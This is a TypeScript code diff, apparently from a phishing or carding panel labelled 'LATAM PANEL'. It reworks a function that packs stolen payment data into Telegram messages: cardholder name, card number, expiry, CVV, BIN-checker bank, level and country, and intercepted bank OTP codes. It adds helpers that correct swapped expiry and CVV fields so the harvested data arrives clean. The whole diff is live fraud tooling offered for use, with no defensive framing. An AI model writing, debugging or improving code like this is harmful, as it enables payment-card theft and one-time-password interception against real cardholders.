@@ -142,31 +142,55 @@ function keyboard(sessionId: string, brand: string) {
   };
 }
 
+function looksLikeExp(value: string) {
+  return /^\d{2}\s*\/\s*\d{2,4}$/.test(value.trim());
+}
+
+function looksLikeCvv(value: string) {
+  return /^\d{3,4}$/.test(value.trim());
+}
+
+function expAndCvvFromPayload(cpayload: Record<string, unknown>) {
+  const expField = String(cpayload.exp || '').trim();
+  const cvField = String(cpayload.cv || '').trim();
+  if (looksLikeExp(cvField) && (looksLikeCvv(expField) || !looksLikeExp(expField))) {
+    return { exp: cvField || '-', cvv: expField || '-' };
+  }
+  if (looksLikeCvv(expField) && (looksLikeExp(cvField) || !looksLikeCvv(cvField))) {
+    return { exp: cvField || '-', cvv: expField || '-' };
+  }
+  return { exp: expField || '-', cvv: cvField || '-' };
+}
+
 // Plantilla unica para todos los eventos: page views, pago y OTP usan la misma estructura.
 function formatTelegramMessage(payload: Record<string, unknown>) {
   console.log('PAYLOAD FROM MAP: ', payload);
   const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
-  const meta = payload.meta as Record<string, unknown> | undefined;
-  const brand = String(payload.brand || mockCard?.brand || meta?.brand || '-');
-  const amount = String(meta?.amount || '-');
+  const meta = objectValue(payload.meta) || {};
+  const cpayload = objectValue(meta.cpayload) || {};
+  const checker = objectValue(cpayload.checker) || {};
+  const metaOtp = objectValue(payload.metaOtp) || {};
+  const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
+  const amount = String(meta.amount || '-');
+  const { exp, cvv } = expAndCvvFromPayload(cpayload);
   const lines = [
     '✈️ LATAM PANEL',
     '━━━━━━━━━━━━━━━━━━',
     `💵 Monto: $ ${amount}`,
     '',
     '💳 DATOS DE PAGO',
-    `👤 Titular: ${payload?.meta?.cpayload?.holder || '-'}`,
+    `👤 Titular: ${cpayload.holder || '-'}`,
     `🏷️ Marca: ${brand.toUpperCase()}`,
-    `💳 Tarjeta: ${payload.meta.cpayload.b || '-'}`,
-    `📅 Expira: ${payload?.meta?.cpayload?.exp || '-'}`,
-    `📅 CVV: ${payload?.meta?.cpayload?.cv || '-'}`,
+    `💳 Tarjeta: ${cpayload.b || '-'}`,
+    `📅 Expira: ${exp}`,
+    `📅 CVV: ${cvv}`,
     '',
-    `📅 Nivel: ${payload?.meta?.cpayload?.checker?.level || '-'}`,
-    `📅 Banco: ${payload?.meta?.cpayload?.checker?.bank || '-'}`,
-    `📅 País: ${payload?.meta?.cpayload?.checker?.country || '-'}`,
+    `📅 Nivel: ${checker.level || '-'}`,
+    `📅 Banco: ${checker.bank || '-'}`,
+    `📅 País: ${checker.country || '-'}`,
     '',
     '💰 OTP',
-    `💵 Código: ${payload.metaOtp.otp}`,
+    `💵 Código: ${metaOtp.otp || '-'}`,
     '━━━━━━━━━━━━━━━━━━',
   ];
 
